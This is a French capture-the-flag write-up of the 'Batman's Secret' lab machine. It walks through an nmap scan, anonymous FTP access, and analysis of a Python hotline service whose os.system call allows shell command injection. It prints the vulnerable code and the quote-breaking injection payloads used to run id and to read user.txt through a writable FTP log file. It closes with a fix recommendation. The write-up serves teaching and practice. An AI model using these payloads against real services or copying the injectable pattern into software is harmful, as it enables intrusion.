# Batman’s Secret — Boot2Root

## 1. Informations générales

* **Challenge :** Batman’s Secret
* **Difficulté :** Easy
* **Objectif :** trouver le fichier `user.txt`
* **IP cible :** `10.10.0.41`
* **Environnement :** Exegol
* **Service intéressant :** FTP, SSH et service personnalisé sur le port `3000`

---

# 2. Reconnaissance

La première étape consiste à effectuer un scan des ports et services disponibles sur la machine cible.

```bash
nmap -sC -sV 10.10.0.41
```

Résultat intéressant :

```text
21/tcp   open  ftp     vsftpd 3.0.5
22/tcp   open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4
3000/tcp open          Gotham Hotline
```

Le scan révèle notamment :

* un serveur FTP sur le port `21` ;
* SSH sur le port `22` ;
* un service personnalisé sur le port `3000`.

Le résultat du script `ftp-anon` indique également que **l'accès FTP anonyme est autorisé**.

On observe :

```text
Anonymous FTP login allowed
```

---

# 3. Énumération du serveur FTP

Connexion au serveur FTP :

```bash
ftp 10.10.0.41
```

Identifiants utilisés :

```text
Name: anonymous
Password: anonymous
```

L'authentification fonctionne.

On liste ensuite le contenu du répertoire :

```text
ftp> ls -la
```

Résultat :

```text
-rwxr-xr-x    1 0 0 1115 Jul 23 13:42 alert.py
drwxrwxrwx    1 0 0 4096 Jul 23 13:42 logs
```

Deux éléments attirent particulièrement l'attention :

* `alert.py`, qui est récupérable ;
* `logs/`, qui possède des permissions `777`.

On télécharge le script :

```text
ftp> get alert.py
```

Puis on entre dans le répertoire `logs` :

```text
ftp> cd logs
ftp> ls -la
```

On découvre :

```text
-rwxrwxrwx    1 0 0 0 Jul 23 13:42 report.txt
```

Le fichier `report.txt` est vide mais entièrement accessible en écriture.

---

# 4. Analyse de `alert.py`

Le fichier est ensuite analysé localement :

```bash
cat alert.py
```

Code intéressant :

```python
#!/usr/bin/env python3

import os
import socket
import time

HOST = "0.0.0.0"
PORT = 3000

def handle_client(conn, addr):
    print(f"[+] Incoming hotline call from {addr}")
    conn.send("🦇 Gotham Hotline: Identify yourself.\n$> ".encode("utf-8"))

    data = conn.recv(1024).strip().decode()

    if data == "G0th4mN33dsTh3B4t!":
        conn.send(b'Authorized signal. What is the emergency?\n$> ')
        alert_text = conn.recv(1024).strip().decode()
        os.system("bash -c 'echo %s > /opt/hotline/logs/report.txt'" % alert_text)
        conn.send(b"Alert received. Mobilizing Knightfall Protocol.\n")
        time.sleep(1)
        conn.send(b"Batmobile deployed.\n")
    else:
        conn.send(b"Unauthorized signal. Transmission terminated.\n")

    conn.close()
```

Le point critique est :

```python
os.system("bash -c 'echo %s > /opt/hotline/logs/report.txt'" % alert_text)
```

La variable :

```python
alert_text
```

provient directement de l'utilisateur :

```python
alert_text = conn.recv(1024).strip().decode()
```

Elle est ensuite concaténée directement dans une commande shell passée à `os.system()`.

Il n'y a donc aucun échappement ou filtrage empêchant l'injection de commandes.

---

# 5. Analyse du service sur le port 3000

Connexion au service :

```bash
nc 10.10.0.41 3000
```

Le serveur répond :

```text
🦇 Gotham Hotline: Identify yourself.
$>
```

Le contenu du script permet de déduire qu'une chaîne spécifique est nécessaire.

On envoie :

```text
G0th4mN33dsTh3B4t!
```

Le serveur répond :

```text
Authorized signal. What is the emergency?
$>
```

Le service attend alors notre message d'urgence.

---

# 6. Confirmation de l'injection de commandes

Le code construit une commande shell de la forme :

```bash
bash -c 'echo <alert_text> > /opt/hotline/logs/report.txt'
```

Comme `alert_text` est contrôlé par l'utilisateur, il est possible de fermer la quote utilisée autour de l'argument et d'injecter une nouvelle commande.

Une première tentative a été réalisée avec :

```text
x'; id; echo '
```

La réponse du service reste normale :

```text
Alert received. Mobilizing Knightfall Protocol.
Batmobile deployed.
```

Cependant, la sortie de `id` n'est pas visible directement sur notre connexion `nc`.

Le fichier `report.txt` sert donc de **canal de récupération de la sortie**.

---

# 7. Identification de l'utilisateur exécutant les commandes

Une injection est utilisée afin d'écrire directement le résultat de `id` dans :

```text
/opt/hotline/logs/report.txt
```

Payload utilisé :

```text
x'; id > /opt/hotline/logs/report.txt; echo '
```

Le fichier est ensuite récupéré par FTP :

```text
ftp 10.10.0.41
```

Puis :

```text
anonymous
cd logs
get report.txt
bye
```

Lecture :

```bash
cat report.txt
```

Résultat :

```text
uid=1000(bruce) gid=1000(bruce) groups=1000(bruce)
```

On sait donc que les commandes injectées sont exécutées avec les privilèges de l'utilisateur :

```text
bruce
```

---

# 8. Recherche de `user.txt`

Puisque les commandes sont exécutées en tant que `bruce`, on peut rechercher le fichier demandé par le challenge dans son répertoire personnel.

Payload utilisé :

```text
x'; find /home/bruce -name user.txt -exec cat {} \; > /opt/hotline/logs/report.txt; echo '
```

La commande :

```bash
find /home/bruce -name user.txt
```

permet de rechercher le fichier `user.txt`.

L'option :

```bash
-exec cat {} \;
```

permet ensuite d'afficher son contenu.

La sortie est redirigée vers :

```text
/opt/hotline/logs/report.txt
```

Le fichier est récupéré via FTP :

```text
ftp 10.10.0.41
```

Puis :

```text
anonymous
cd logs
get report.txt
bye
```

Enfin :

```bash
cat report.txt
```

Résultat :

```text
EPI{********}
```

---

# 9. Flag

```text
EPI{********}
```

---

# 10. Chaîne d'exploitation

La chaîne complète est :

```text
Nmap
 │
 ├── FTP 21
 │     │
 │     ├── Anonymous login
 │     ├── alert.py
 │     └── logs/report.txt
 │
 └── Service Gotham Hotline 3000
             │
             ▼
      G0th4mN33dsTh3B4t!
             │
             ▼
       alert_text contrôlé
             │
             ▼
       Bash command injection
             │
             ▼
          utilisateur
            bruce
             │
             ▼
      /home/bruce/user.txt
             │
             ▼
EPI{********}
```

---

# 11. Vulnérabilité principale

La vulnérabilité principale est une **injection de commandes OS (Command Injection)**.

Le problème vient de l'utilisation de données contrôlées par l'utilisateur dans une commande passée à :

```python
os.system()
```

sans validation ou échappement approprié.

Le code vulnérable est :

```python
os.system("bash -c 'echo %s > /opt/hotline/logs/report.txt'" % alert_text)
```

Une implémentation sécurisée devrait éviter de construire une commande shell avec des données utilisateur. Par exemple, pour écrire simplement dans un fichier, Python peut écrire directement dans le fichier avec `open()` plutôt que d'appeler `bash`.

---

# 12. Conclusion

Le challenge repose sur plusieurs éléments qui s'enchaînent :

1. Le serveur FTP accepte les connexions anonymes.
2. Le FTP permet de récupérer `alert.py`.
3. L'analyse du script révèle le fonctionnement du service sur le port `3000`.
4. Le service demande une chaîne d'authentification présente dans le code.
5. Le champ `alert_text` est directement injecté dans une commande `bash`.
6. Cette vulnérabilité permet d'exécuter des commandes arbitraires.
7. Les commandes sont exécutées sous l'utilisateur `bruce`.
8. La sortie peut être récupérée via `logs/report.txt`, accessible par FTP.
9. La recherche de `user.txt` permet finalement de récupérer le flag.

**Flag final :**

```text
EPI{********}
```
